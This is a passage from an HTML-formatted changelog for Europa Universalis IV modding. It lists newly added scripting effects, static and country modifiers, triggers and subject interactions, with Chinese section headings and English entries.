&#x3D; <country scope> #Province scope, spawns a revolutionary guard artillery unit in the current province scope for the defined country scope.</li><li>Added hire_advisor &#x3D; { type &#x3D; &lt;advisor_type&gt; cost_mulitplier &#x3D; <double> skill &#x3D; <int> name &#x3D; <string> religion &#x3D; <religion> culture &#x3D; <culture> female &#x3D; <boolean> location &#x3D; &lt;province_id&gt; age &#x3D; <int> max_age &#x3D; <int> min_age &#x3D; <int> } #Country scope, An effect which forcefully recruits an advisor and puts it into your court. The old advisor gets fired if the space is preoccupied already. From a scripting point of view, it works exactly like “define_advisor” with all the same parameters.</li><li>Added steer_trade &#x3D; <country> #Country scope, the current country scope steers trade power to the specified country scope.</li><li>Added disband_all_units &#x3D; yes #Country scope, the current country scope disbands all units it has. No matter where they are. Units, which are in battle while this effect fires are “stack wiped”.</li><li>Added disband_all_regiments &#x3D; yes #Country scope, the current country scope disbands all troops it has. No matter where they are. Units, which are in battle while this effect fires are “stack wiped”.</li><li>Added disband_all_ships &#x3D; yes #Country scope, the current country scope disbands all ships it has. No matter where they are. Units, which are in battle while this effect fires are “stack wiped”.</li><li>Added add_construction_progress &#x3D; <float> #Province scope, used to only affect great projects but now applies to any construction.</li><li>Added remove_guarantee &#x3D; &lt;country_scope&gt; #Country scope, the current scope removes its guarantee of the specified country.</li><li>Added remove_country &#x3D; yes #Country scope, the current country scope gets removed from existence. All of its provinces become uncolonized, all subjects become independent and all units are getting disbanded.</li><li>Added define_advisor &#x3D; {} now accepts min_age &#x3D; <int>, max_age &#x3D; <int> and age &#x3D; <int>.</li><li>Added Naval Doctrines, Personal Deities, Policies, Decrees and Assimilated Cultures from the Diwan Mechanic have now effect &#x3D; {} and removed_effect &#x3D; {} sections.</li><li>Added add_government_power &#x3D; { mechanic_type &#x3D; &lt;government_mechanic_id&gt; power_type &#x3D; &lt;government_power_type_id&gt; value &#x3D; <float> } #adds government power.</li><li>Added add_government_power_scaled_to_seats &#x3D; { mechanic_type &#x3D; &lt;government_mechanic_id&gt; power_type &#x3D; &lt;government_power_type_id&gt; value &#x3D; <float> } #adds government power, scaled to the number of seats in parliament.</li><li>Added set_government_power &#x3D; { mechanic_type &#x3D; &lt;government_mechanic_id&gt; power_type &#x3D; &lt;government_power_type_id&gt; value &#x3D; <float> } #sets government power.</li><li>Added freeze_government_power &#x3D; { mechanic_type &#x3D; &lt;government_mechanic_id&gt; power_type &#x3D; &lt;government_power_type_id&gt; } #government power no longer changes.</li><li>Added unfreeze_government_power &#x3D; { mechanic_type &#x3D; &lt;government_mechanic_id&gt; power_type &#x3D; &lt;government_power_type_id&gt; } #government power can change again.</li><li>Added add_rebel_progress &#x3D; { (rebel_type &#x3D; <rebel type>) value &#x3D; <int> } #Add rebel progress to a specified rebel type. If no rebel type is defined then add progress to all rebels.</li><li>Added start_debate &#x3D; <parliament issue id> #Country scope, immediately starts the defined debate. Ongoing debates will be canceled (canceling a debate should NOT activate the prestige loss).</li><li>Added cancel_current_debate &#x3D; yes #Country scope, cancel the current debate immediately. You can start a new debate then.</li><li>Added remove_enacted_issue &#x3D; yes #Coutnry scope, the current enacted parliament issue gets removed. You can start a new debate.</li><li>Added enact_issue &#x3D; <parliament issue id> #Country scope, immediately enact the parliament issue and skip the whole process of debating about an issue.</li><li>Added end_current_debate &#x3D; yes&#x2F;no #Country scope, end the current debate immediately. If “yes” then the debate succeeds and the issue gets enacted. If “no” then the issue fails and you get the penalty for it.</li><li>Added regenerate_government_mechanics &#x3D; yes #Regenerate the country’s government mechanics. Used for UI purposes.</li><li>Added set_papal_controller &#x3D; <country scope> #Sets the defined country scope as the new papal controller.</li><li>Added remove_power_projection &#x3D; { key &#x3D; <key of the power projection> amount &#x3D; <int> (amount is optional, if not defined, remove the whole key instead) }.</li><li>Added remove_hegemon &#x3D; <country scope> #The defined country loses its hegemon status.</li><li>Added add_subjects_development_ducats &#x3D; {multiplier &#x3D; <double> age_multiplier &#x3D; <double> custom_tooltip &#x3D; <tooltip> trigger &#x3D; {} } #Add ducats scaling with the development of your defined subject. Multiplier and age multiplier multiply the number of ducats you gain while the trigger checks which subject countries are taken into consideration.</li><li>Added add_owned_provinces_development_ducats &#x3D; { mulitplier &#x3D; <double> age_multiplier &#x3D; <double> custom_tooltip &#x3D; <tooltip> trigger &#x3D; {} } #Add ducats scaling with the development of your provinces. Multiplier and age multiplier multiply the number of ducats you gain while the trigger checks which provinces are taken into consideration.</li><li>Added add_owned_provinces_development_manpower &#x3D; {multiplier &#x3D; <double> age_multiplier &#x3D; <double> custom_tooltip &#x3D; <tooltip> trigger &#x3D; {} } #Add manpower scaling with the development of your defined subject. Multiplier and age multiplier multiply the amount of manpower you gain while the trigger checks which subject countries are taken into consideration.</li><li>Added add_subjects_development_manpower &#x3D; { mulitplier &#x3D; <double> age_multiplier &#x3D; <double> custom_tooltip &#x3D; <tooltip> trigger &#x3D; {} } #Add ducats manpower with the development of your provinces. Multiplier and age multiplier multiply the amount of manpower you gain while the trigger checks which provinces are taken into consideration.</li><li>Added tercio_infantry &#x3D; <country scope> #Province scope, spawns a Tercio regiment.</li><li>Added musketeer_infantry &#x3D; <country scope> #Province scope, spawns a Musketeer regiment.</li><li>Added samurai_infantry &#x3D; <country scope> #Province scope, spawns a Samurai regiment.</li><li>Added geobukseon_galley &#x3D; <country scope> #Province scope, spawns a Geobukseon Galley.</li><li>Added man_of_war_heavy &#x3D; <country scope> #Province scope, spawns a Man of War Heavy.</li><li>Added man_of_war_light &#x3D; <country scope> #Province scope, spawns a Man of War Light Ship.</li><li>Added galleon_heavy &#x3D; <country scope> #Province scope, spawns a Galleaon Heavy.</li><li>Added galleass_galley &#x3D; <country scope> #Province scope, spawns a Galleass Galley.</li><li>Added caravel_light &#x3D; <country scope> #Province scope, spawns a Caravel Light.</li><li>Added voc_indiamen_light &#x3D; <country scope> #Province scope, spawns a VOC Indiaman Light Ship.</li><li>Added create_unit_forcelimit_percentage &#x3D; { type &#x3D; &lt;unit type such as infantry, cavalry, etc.&gt; (special_unit_category &#x3D; &lt;special unit type such as cossacks, tercio, musketeer&gt;) force_limit_percentage &#x3D; <double> }.</li><li>Added extend_country_modifier &#x3D; { name &#x3D; <modifier id> duration &#x3D; <days> }.</li><li>Added start_debate &#x3D; <parliament issue id> #Country scope, immediately starts the defined debate. Ongoing debates will be canceled (canceling a debate should NOT activate the prestige loss).</li><li>Added cancel_current_debate &#x3D; yes #Country scope, cancel the current debate immediately. You can start a new debate then.</li><li>Added remove_enacted_issue &#x3D; yes #Coutnry scope, the current enacted parliament issue gets removed. You can start a new debate.</li><li>Added enact_issue &#x3D; <parliament issue id> #Country scope, immediately enact the parliament issue and skip the whole process of debating about an issue.</li><li>Added end_current_debate &#x3D; yes&#x2F;no #Country scope, end the current debate immediately. If “yes” then the debate succeeds and the issue gets enacted. If “no” then the issue fails and you get the penalty for it.</li><li>Added set_papal_controller &#x3D; <country scope> #Sets the defined country scope as the new papal controller.</li><li>Added remove_power_projection &#x3D; { key &#x3D; <key of the power projection> amount &#x3D; <int> (amount is optional, if not defined, remove the whole key instead) }</li></ul><h3 id="修正"><a href="#修正" class="headerlink" title="修正"></a>修正</h3><ul><li>Custom icons can now be used for country modifiers</li><li>Added static modifier under_governing_capacity_modifier &#x3D; {}</li><li>Added static modifier mandate &#x3D; {} #100% Strength at 100 Mandate, 0% at 0 Mandate</li><li>Added static modifier imperial_authority &#x3D; {} #100% Strength at 100 Imperial Authority, 0% at 0 Imperial Authority</li><li>Added static modifier positive_imperial_authority &#x3D; {} #100% Strength at 100 Imperial Authority, 0% at 50 Imperial Authority</li><li>Added static modifier negative_imperial_authority &#x3D; {} #100% Strength at 0 Imperial Authority, 0% at 50 Imperial Authority</li><li>Added static modifier average_over_sea_liberty_desire &#x3D; {} #Country scope, This static modifier scales with the average liberty desire of all your “Oversea subjects”. A subject is overseas if their capital is on a different continent than your capital. It will be needed for colonial content. The higher the average, the better the modifiers. Only counts subjects that have the “is_oversea_subject_type &#x3D; yes” (see the subject types section here) for the average. This way tributaries and daimyos would not affect this static modifier for their overlord. Applies to the overlord. The multiplier scales with the average liberty desire.</li><li>Added static modifier reverse_average_over_sea_liberty_desire &#x3D; {} #Country scope, This static modifier scales inversely with the average liberty desire of all your “Oversea subjects”. A subject is overseas if their capital is on a different continent than your capital. It will be needed for colonial content. Only counts subjects that have the “is_oversea_subject_type &#x3D; yes” (see the subject types section here) for the average. This way tributaries and daimyos would not affect this static modifier for their overlord. The lower the average, the better the modifiers. Applies to the overlord. The multiplier scales with the average liberty desire.</li><li>Added static modifier average_liberty_desire &#x3D; {} #Country scope, This static modifier scales with the average liberty desire of ALL of your subjects. The higher the average, the better the modifiers. Applies to the overlord. The multiplier scales with the average liberty desire.</li><li>Added static modifier reverse_average_liberty_desire &#x3D; {} #Country scope, This static modifier scales inversely with the average liberty desire of ALL of your subjects. The lower the average, the better the modifiers. Applies to the overlord. The multiplier scales with the average liberty desire.</li><li>Added static modifier average_global_autonomy_modifer &#x3D; {} #Country scope, scales with the average global autonomy your country has. The more autonomous the state, the stronger the modifiers.</li><li>Added static modifier reverse_average_global_autonomy_modifer &#x3D; {} #Country scope, scales inversely with the average global autonomy your country has. The less autonomous the state, the stronger the modifiers.</li><li>Added special_unit_cost_modifier &#x3D; <float> #Country modifier, modifies the non-manpower&#x2F;sailors cost of all special unitsspecial_unit_manpower_cost_modifier.</li><li>Added some special unit modifiersnumber_of_cannons &#x3D; &lt;int.</li><li>Added monarch_power_tribute &#x3D; <integer> #Increases the yearly monarch power tribute a tributary pays to its overlord by this amount (still caps the same as usual monarch power tribute)</li><li>Added tributary_conversion_cost_modifier &#x3D; <float> #Modifies the cost of the mandate that is required to turn a tributary into a vassal, which is unlocked via the final reform of the mandate.</li><li>Added global_allowed_num_of_manufactories &#x3D; <integer> #Increases the number of possible manufactories that all provinces of the country scope can have. #Works similarly to its local modifier equivalent!</li><li>Added can_claim_states &#x3D; yes &#x2F; no #Allows for fabricating claims on areas instead of provinces, much like the Tsardom T1 Government reform already allows</li><li>Added free_concentrate_development &#x3D; yes #Allows for concentrate development without the cost, much like the Mandala government reform</li><li>Added expand_infrastructure_cost &#x3D; <float> #Modifies the cost of the Expand Infrastructure action, by reducing both the reform progress and adm cost required, by a percentage</li><li>Added max_absolutism_effect &#x3D; <float> #modifies the maximum effect of absolutism on modifiers</li><li>Added chance_to_inherit &#x3D; <float> #Country scope, increases the chance to inherit a personal union when your ruler dies</li><li>Added culture_conversion_time &#x3D; <float> #Country scope, modifies the time needed to culturally convert a province. A negative number means that it goes faster (so -0.25 would be equal to 25% faster culture conversion)</li><li>Added local_culture_conversion_time &#x3D; <float> #Province scope, modifies the time needed to culturally convert the province which has this modifier. A negative number means that it goes faster (so -0.25 would be equal to 25% faster culture conversion)</li><li>Added same_religion_advisor_cost &#x3D; <float> #Country scope, works like same_culture_advisor_cost, but instead of checking for the culture it checks for the religion of the advisor and if it matches with the ruler.</li><li>Added artillery_barrage_cost &#x3D; <float> #Country scope, modifies the cost for using “Artillery Barrage” action during sieges. Should be usable as a trait for your generals too, so a general with artillery_barrage_cost &#x3D; -0.5 would have 50% cheaper barrages in a siege</li><li>Added great_project_upgrade_time &#x3D; <float> #Country scope, modifies the time needed to upgrade a great project. Has the build_time modifier as a fallback if Leviathan is disabled.</li><li>Added local_great_project_upgrade_time &#x3D; <float> #Province scope, modifies the time needed to upgrade a great project in the province with this modifier. Has the local_build_time modifier as a fallback if Leviathan is disabled.</li><li>Added warscore_from_battles_modifier &#x3D; <double> #Country scope, modifiers the amount of war score you gain from land and naval battles. Take DEFAULT_WARGOAL_BATTLESCORE_BONUS for more context.</li><li>Added yearly_innovativeness &#x3D; <float> #Country scope, gives you yearly innovativeness equal to the value of the modifier * so a yearly_innovativeness &#x3D; 0.25 would be 0.25 innovativeness each year. Is not present if you don’t have Rule Britannia active.</li><li>Added enable_forced_march &#x3D; yes #Country, Army scope, allows you to use Force March for this army regardless of your current tech level. A merc company with this ability could just force march.</li><li>Added reverse_relation_with_same_religion &#x3D; <int> #Country scope, modifies the opinion of OTHER countries towards you. So for example: if you are Catholic and you have reverse_relation_with_same_religion &#x3D; 25 then every other Catholic country has a +25 opinion of you. Conceptually, it works like the Religious Diplomats’ estate privilege. It’s a way to get rid of a performance-heavy hidden event which is also the reason why the AI is not allowed to take the privilege.</li><li>Added janissary_cost_modifier &#x3D; <float> #Country, modifies the mil power cost for recruiting Janissaries</li><li>Added yearly_government_power &#x3D; <float> #Country, adds the defined value flat to the government mechanic buttons like the one needed for the Russian government.</li><li>Added number_of_cannons_modifier &#x3D; <float> #Country&#x2F;Flagship scope, modifies the number of cannons all of your ships have. Multiplicative modifier (so a heavy with 200 cannons would have 220 cannons if the modifier number_of_cannons_modifier &#x3D; 0.1 is applied).</li><li>Added hull_size_modifier &#x3D; <float> #Country&#x2F;Flagship scope, modifies the hull size of all of your ships. Multiplicative modifier (so a heavy with 60 hull size would have 66 hull size if the modifier hull_size_modifier &#x3D; 0.1 is applied).</li><li>Added max_flagships &#x3D; <int> #Country scope, which modifies the number of flagships a country can have at the same time. Baseline, all countries should have 1 in the static modifiers.</li><li>Added heavy_ship_cannons &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the number of cannons all of your heavy ships have. Multiplicative modifier</li><li>Added heavy_ship_hull_size &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the hull size of your heavy ships</li><li>Added light_ship_cannons &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the number of cannons all of your light ships have. Multiplicative modifier</li><li>Added light_ship_hull_size &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the hull size of your light ships</li><li>Added galley_cannons &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the number of cannons all of your galleys have. Multiplicative modifier</li><li>Added galley_hullsize &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the hull size of your galleys</li><li>Added transport_cannons &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the number of cannons all of your transports have. Multiplicative modifier</li><li>Added transport_hullsize &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship&#x2F;Flagship scope, modifies the hull size of your transports</li><li>Added loyalty_change_on_revoked &#x3D; <float> #Country scope, modifies the estate loyalty hit when you revoke a privilege. So for example: loyalty_change_on_revoked &#x3D; -0.10 would mean that you lose 30% Estate Loyalty instead of 20%</li><li>Added estate_interaction_cooldown_modifier &#x3D; <float> #Country scope, modifies the months needed until you can enact one of the estate interactions again (like Seizing Land). The cooldown in question is defined as “cooldown_months &#x3D; <int>“ in common&#x2F;estate_crown_land&#x2F;00_interactions.txt</li><li>Added all_estate_possible_privileges &#x3D; <int> #Increases the number of possible privilege slots on all estates</li><li>Added the ability to define “privilege” modifiers for the estates which increase the number of possible privileges to grant</li><li>Added allow_mercenary_drill &#x3D; yes #Country&#x2F;Army scope, allows Mercenaries the ability to drill. Is not shown when you don’t have Cradle of Civilization</li><li>Added merc_leader_army_tradition &#x3D; <float> #Country&#x2F;Army scope, modifies the army tradition a leader of a merc company is spawned with</li><li>Added merc_independent_from_trade_range &#x3D; yes #Country scope, allows you to recruit merc companies which have their home in provinces which are outside your trade range</li><li>Added allow_mercenaries_to_split &#x3D; yes #Country&#x2F;Army scope, allow Mercenaries to split. They can only merge with regiments of their own company though. (this one might not be possible to implement, but should be tried nonetheless). CAN CAUSE DESYNCHS</li><li>Added centralize_state_cost &#x3D; <float> #Country scope, modifies the adm and government reform progress cost for centralizing a state. Does nothing if you don’t have Leviathan enabled.</li><li>Added local_centralize_state_cost &#x3D; <float> #Province scope, modifies the adm and government reform progress cost for centralizing a state in the province with the modifier. Does nothing if you don’t have Leviathan enabled.</li><li>Added land_morale_constant &#x3D; <float> #Country&#x2F;Army&#x2F;Unit scope, adds a flat amount of morale for the land army or for the unit itself * depending on the scope</li><li>Added naval_morale_constant &#x3D; <float> #Country&#x2F;Fleet&#x2F;Flagship&#x2F;Ship scope, adds a flat amount of morale for the fleet or for the ship itself * depending on the scope</li><li>Added max_general_shock&#x2F;fire&#x2F;maneuver&#x2F;siege &#x3D; <integer> #Country scope, increases the max amounts of pips a general can have in the category. So a max_general_shock &#x3D; 2 would mean a general could have, theoretically, 8 pips in shock (under the assumption the LEADER_MAX_PIPS &#x3D; 6 is in defines). Works for conquistadors too.</li><li>Added max_admiral_shock&#x2F;fire&#x2F;maneuver&#x2F;siege &#x3D; <integer> #Country scope, increases the max amounts of pips an admiral can have in the category. So a max_admiral_fire &#x3D; 2 would mean a general could have, theoretically, 8 pips in fire (under the assumption the LEADER_MAX_PIPS &#x3D; 6 is in defines). Works for explorers too.</li><li>Added coast_raid_range &#x3D; <int> #Country scope, modifies the amounts of sea tiles you can raid in. Base line, you can raid provinces which are at max 3 sea provinces away from your closest port. With a coast_raid_range &#x3D; 2, this would be increased to 5</li><li>Added development_cost_in_primary_culture &#x3D; <float> #Country scope, modifies the development cost of provinces of your primary culture</li><li>Added reduced_trade_penalty_on_non_main_tradenode &#x3D; <float> #Country scope, modifies the trade power penalty from collecting in your non-main trade nodes * this adds on to TRADE_NON_CAPITAL_OFFICE (-0.5) to give the total penalty, so positive numbers here are good</li><li>Added colony_cost_modifier &#x3D; <float> #Country, modifies the maintenance cost of having colonies in progress. Multiplicative.</li><li>Added local_colony_cost_modifier &#x3D; <float> #Province, modifies the maintenance cost of the current colony with this modifier for its owner. Multiplicative.</li><li>Added spy_action_cost_modifier &#x3D; <float> #Country, modifies the spy network costs of ALL spy actions. Multiplicative.</li><li>Added placed_merchant_power_modifier &#x3D; <float> #Works similarly as placed_merchant_power but is increased on a % basis</li><li>Added reduced_liberty_desire_on_other_continent &#x3D; -20 #Works similarly to reduced_liberty_desire_on_same_continent, integer!</li><li>Added overextension_impact_modifier &#x3D; <float> #Reduces or Increases the impact of conquered provinces in regards to the overextension</li><li>Added artillery_level_modifier &#x3D; <float> #Country&#x2F;Army scope, (not to be confused with the one that allows using more artillery for a siege) multiplier for how much an artillery unit contributes towards a siege. E.g. 0.2 would mean a 20% bonus, so 5 artillery would count for 6</li><li>Added local_tolerance_of_heretics &#x3D; <double> #Province scope, works like Tolerance of Heretics, but on a province level so this means the province gets treated as if you have the global Tolerance of Heretics + the local value. (To make it more understandable: imagine you have +1 Tolerance of Heretics. All heretic provinces have -1 Local Unrest. A province with +1 Local Tolerance of Heretics would however now have -2 Local Unrest)</li><li>Added local_tolerance_of_heathens &#x3D; <double> #Province scope, works like local_tolerance_of_heretics, but for heathens instead</li><li>Added garrison_damage &#x3D; <float> #Country, modifies the damage the garrison deals when the fort gets assaulted or when you use the sortie to fight the hostile army</li><li>Added local_garrison_damage &#x3D; <float> #Province, modifies the damage the local garrison deals when the fort gets assaulted or when you use the sortie to fight the hostile army</li><li>Added assault_fort_cost_modifier &#x3D; <float> #Country, modifies the military cost to assault forts</li><li>Added local_assault_fort_cost_modifier &#x3D; <float> #Province, modifies the military cost to assault the fort of the province which has this modifier. This applies to the besieging force</li><li>Added assault_fort_ability &#x3D; <float> #Country&#x2F;Army&#x2F;Unit, modifies the damage your troops deal to the garrison when assaulting a fort</li><li>Added local_assault_fort_ability &#x3D; <float> #Province, modifies the damage assaulting troops would deal to the garrison. Here, negative numbers are green as you want to have the local version be negative.</li><li>Added vassal_manpower_bonus &#x3D; <float> #Country scope, modifies the bonus of manpower gained from their subjects. The manpower from the subject gained is defined in the subject_types script as manpower_to_overlord &#x3D; <float></li><li>Added vassal_sailors_bonus &#x3D; <float> #Country scope, modifies the bonus of sailors gained from their subjects. The manpower from the subject gained is defined in the subject_types script as sailors_to_overlord &#x3D; <float></li><li>Added vassal_naval_forcelimit_bonus &#x3D; <float> #Country scope, modifies the bonus to a country’s naval force limit from their subjects. The naval force limit gain is defined as naval_forcelimit_to_overlord &#x3D; <float></li><li>Added annexation_relations_impact &#x3D; <float> #Country scope (applied to the overlord), modifies the impact of the relations applied to all subjects when their overlord is annexing a subject. If you didn’t know: annexing subjects gives all other subjects -30 opinion.</li><li>Added can_revoke_parliament_seats &#x3D; yes #Country scope, allows you to remove seats from a province</li><li>Added parliament_backing_chance &#x3D; <float> #Country scope, modifies how many seats will back an issue in general</li><li>Added parliament_effect_duration &#x3D; <int> #Country scope, adds a flat number of years for an issue’s effects to prevail once passed. NOTE: No issue should have a lower time of year than 1 year.</li><li>Added parliament_debate_duration &#x3D; <int> #Country scope, adds a flat number of years of the time needed for an issue to get into the debate phase. If an issue would reach 0 or negative years then the issue is in the debate phase the day it is active.</li><li>Added parliament_chance_of_decision &#x3D; <float> #Country scope, adds an additional % chance to the chance of a debate is ended after PARLIAMENT_DEBATE_DURATION</li><li>Added num_of_parliament_issues &#x3D; <int> #Country scope, increases the max amount of issues you can pick from. The NUM_PARLIAMENT_ISSUES in the defines would be converted into a modifier with this.</li><li>Added max_possible_parliament_seats &#x3D; <int> #Country scope, which determines how many possible parliament seats your parliament can have. If the modifier is 0 or negative then your parliament can have unlimited parliament seats like how it is working now.</li><li>Added can_recruit_cawa &#x3D; yes</li><li>Added can_recruit_cossacks &#x3D; yes</li><li>Added can_recruit_rajputs &#x3D; yes</li><li>Added can_recruit_revolutionary_guards &#x3D; yes</li><li>Added naval_morale_damage &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship scope, modifies the amount of morale damage your navy deals</li><li>Added naval_morale_damage_received &#x3D; <float> #Country&#x2F;Fleet&#x2F;Ship scope, modifies the amount of morale damage your navy receives</li><li>Added has_&lt;special_unit&gt; &#x3D; yes #Country scope, unlocks the special unit for the country, and makes it available to be recruited. NOTE: I am aware that with the special units added for 1.35, we have decided to go with the &lt;special_unit&gt;_fraction_modifier &#x3D; <float> to make them available. However, we ran into the issue that certain special units would be available to countries that are not supposed to have them. Example: the amount of Tercios you can have should scale with the Army Tradition you have -&gt; we added the fracture modifier to Army Tradition. However, now everyone was able to recruit Tercios as long they had a single Iberian province (we assigned the local_has_tercio &#x3D; yes modifier to the Iberian culture group) which is NOT intended.</li><li>Added no_claim_cost_increasement &#x3D; yes #Country scope, removes the additional cost for fabricating a claim if you already have a claim on this country</li></ul><h3 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h3><ul><li>Added num_of_revolutionary_guard (not sure why it was missing).</li><li>Added num_of_special_units &#x3D; { special_unit_category &#x3D; &lt;special unit type, musketeer&#x2F;tercio&#x2F;streltsy etc&gt; type &#x3D; infantry&#x2F;cavalry&#x2F;artillery&#x2F;etc value &#x3D; <int> }.</li><li>Added years_of_manpower &#x3D; <float> #Country scope, returns true if the country has the float amount of years of manpower in their manpower pool. Works like “years_of_income”.</li><li>Added years_of_sailors &#x3D; <float> #Country scope, returns true if the country has the float amount of years of sailors in their sailor pool. Works like “years_of_income”.</li><li>Added Improve the tooltip of the trade_goods_produced_amount &#x3D; {} trigger.</li><li>Added has_been_humiliated_by &#x3D; <country scope> #Country scope, checks if the current country scope has been ever humiliated by the specified country.</li><li>Added humiliated &#x3D; <country scope> #Country scope, checks if the current country scope has humiliated the specified country.</li><li>Added has_saved_global_event_target &#x3D; <string> #Works exactly like has_saved_event_target, but instead checks for a global event target.</li><li>Added same_trade_node_as &#x3D; <province> #Province scope, returns true if the current scope is in the same trade node as the specified province.</li><li>Added same_home_trade_node_as &#x3D; <country> #Country scope, returns true if the current country scope has the same trade node as the home trade node as the specified country does.</li><li>Added has_owner_harmonized_religion &#x3D; yes #Province scope, returns true if the current province scope has a religion that is harmonized by its owner.</li><li>Added has_owner_secondary_religion &#x3D; yes #Province scope, returns true if the current province scope has a religion that is the secondary of its owner.</li><li>Added secondary_religion_group &#x3D; <religion group> #Country scope, returns true if the country has a religion of the specified religion group as its secondary religion.</li><li>Added has_assimilated_culture_group &#x3D; &lt;country&#x2F;province&#x2F;culture group id&gt; #Country scope, returns true if the country has assimilated the culture group of the specified country&#x2F;province or has assimilated a specified culture group. Works like accepted_culture.</li><li>Added has_assimilated_culture &#x3D; &lt;country&#x2F;province&#x2F;culture id&gt; #Country scope, returns true if the country has assimilated the culture of the specified country (in this case its primary culture)&#x2F;province or has assimilated a specified culture. Works like accepted_culture.</li><li>Added num_ships_protecting_trade &#x3D; <int> &#x2F; <country scope> #Country scope, returns true if the country has at least as many ships protecting trade as the specified country or the specified number.</li><li>Added has_protecting_trade_share_in_trade_node &#x3D; { who &#x3D; <country scope> share &#x3D; <float> } #Province scope (Trade node-specific), Returns true if the country has a certain percentage of the trade in a given node through its light ships protecting trade there.</li><li>Added num_of_pashas &#x3D; <int> #Country scope, returns true if the country has assigned Pashas in at least x areas.</li><li>Added transfers_trade_power_to &#x3D; <country scope> #Country scope, returns true if the current scope transfers trade power to the specified country.</li><li>Added steers_trade_to &#x3D; <country scope> #Country scope, returns true if the current scope steers trade to the specified country.</li><li>Added receives_trade_power_from &#x3D; <country scope> #Country scope, returns true if the specified country scope transfers trade power to the current country scope.</li><li>Added receives_trade_steering_from &#x3D; <country scope> #Country scope, returns true if the specified country scope steers trade to the current country scope.</li><li>Added has_advisor_type_in_pool &#x3D; <advisor type> #Country scope, returns true if any advisor of the specified advisor type is available for you to hire right now. Does not check for hired advisors.</li><li>Added possible_buildings &#x3D; <int> #Province scope, returns true if the amount of possible buildings in the province scope is equal to or higher than the specified int value.</li><li>Added trade_node &#x3D; <trade node id> #Province scope, returns true if the current scope is part of the specified trade node.</li><li>Added home_trade_node &#x3D; <trade node id> #Country scope, returns true if the current scope has its home trade node in the specified trade node.</li><li>Added owned_by_subject_of &#x3D; <country scope> #Province scope, returns true if the province is owned by a subject of the specified country scope.</li><li>Expanded the “employed_advisor” trigger with extra parameters: is_discounted &#x3D; yes #Checks if the advisor in question has a discount which is caused by the cost_multiplier &#x3D; <int> or the discount &#x3D; yes parameters from “define_advisor”, skill &#x3D; <int> #Checks if the advisor in question has a skill level or higher of the specified int, name &#x3D; <string> #Checks if the advisor has a certain name.</li><li>Added empire_of_china_num_reforms_passed &#x3D; <int> #Checks how many reforms the Emperor of China has passed.</li><li>Added empire_of_china_has_active_decree &#x3D; &lt;key&#x2F;yes&#x2F;no&gt; #Checks the current active Decree for the Emperor of China.</li><li>Added num_of_times_expanded_infrastructure &#x3D; <int> #Province scope, counts how many times a province has had its infrastructure expanded.</li><li>is_neighbor_of &#x3D; <tag> #Can now be used in province scope as well as country scope.</li><li>Added has_liberty_desire_modifier &#x3D; <key> #Checks for if a country has a particular liberty desire modifier.</li><li>Added has_eclipsed &#x3D; <country scope> #Country scope, returns true if the current scope is too powerful to select the specified country as a rival (aka. it eclipsed the target country).</li><li>Added has_been_eclipsed_by &#x3D; <country scope> #Country scope, returns true if the current scope is too weak to be selected by the specified country as a rival (aka. it has been eclipsed by the target country).</li><li>Added subject_owns &#x3D; <province scope> #Country scope, returns true if any subject owns the specified province</li><li>Added has_advisor_type_in_pool &#x3D; <advisor type> #Country scope, returns true if any advisor of the specified advisor type is available for you to hire right now. Does not check for hired advisors.</li><li>Added possible_buildings &#x3D; <int> #Province scope, returns true if the amount of possible buildings in the province scope is equal or higher than the specified int value</li><li>Added home_trade_node &#x3D; <trade node id> #Country scope, returns true if the current scope has its home trade node in the specified trade node</li><li>Added owned_by_subject_of &#x3D; <country scope> #Province scope, returns true if the province is owned by a subject of the specified country scope</li><li>Added years_of_manpower &#x3D; <float> #Country scope, returns true if the country has the float amount of years of manpower in their manpower pool. Works like “years_of_income”.</li><li>Added years_of_sailors &#x3D; <float> #Country scope, returns true if the country has the float amount of years of sailors in their sailor pool. Works like “years_of_income”.</li></ul><h3 id="其它-2"><a href="#其它-2" class="headerlink" title="其它"></a>其它</h3><ul><li>Government mechanics, powers and interactions are now fully scriptable (see &#x2F;government_mechanics&#x2F;readme.txt)tribal_allegiance is now a government power, so tribal_allegiance, is yearly.</li><li>Added the “Has Harem events” custom government attribute which now calls all the Harem-related events.</li><li>Split all the estate privileges from one file into several files * for each estate a file.</li><li>Now able to modulate the colors of decision entries.</li><li>Added on actions for religion and culture changing in a province * on_province_religion_changed and on_province_culture_changed.</li><li>Reforms of the Celestial Empire can use them all, member and province modifiers that the HRE uses</li><li>Added subject interaction seize_court_resources &#x3D; yes&#x2F;no #A subject interaction which gives your subject immediately +25% Liberty Desire and you 1 year’s worth of their monthly monarch power generation. No cooldown.</li><li>Added subject interaction request_extra_levies &#x3D; yes&#x2F;no #A subject interaction which gives your subject immediately +25% Liberty Desire and you 1 year’s worth of their manpower and sailors. No cooldown.</li><li>Added subject interaction grant_administrative_autonomy &#x3D; yes&#x2F;no #A subject interaction which gives your subject immediately -10% Liberty Desire and you -20 Reform Progress. No cooldown. Not available when you don’t have the reform progress</li><li>Added subject trait can_gain_favors &#x3D; yes&#x2F;no #A subject trait which allows the overlord to have favors with its subjects if it is set to “yes”. By default, overlords don’t gain any favors with subjects but trust instead. Due to the favor additions from a previous Jira, it should be added now so all these interactions can be used.</li><li>Added subject trait co_belligerent &#x3D; yes&#x2F;no #Enemies can force this subject to join its overlord in the defense war. Only used when the subject has the “joins_overlords_wars &#x3D; no”. By default, it’s “no”.</li><li>Added subject trait called_to_wars &#x3D; yes&#x2F;no #Overlord can ask the subject to join wars like it could ask allies to join. You would require favors to call them to wars. Only used when the subject has the “joins_overlords_wars &#x3D; no”. By default, it’s “no”</li><li>Added subject trait favors_cost_to_join_offensive_wars &#x3D; <int> #Defines how much favors the overlord needs to invest to call the subject into an offensive war</li><li>Added subject trait favors_cost_to_join_defensive_wars &#x3D; <int> #Defines how much favors the overlord needs to invest to call the subject into a defensive 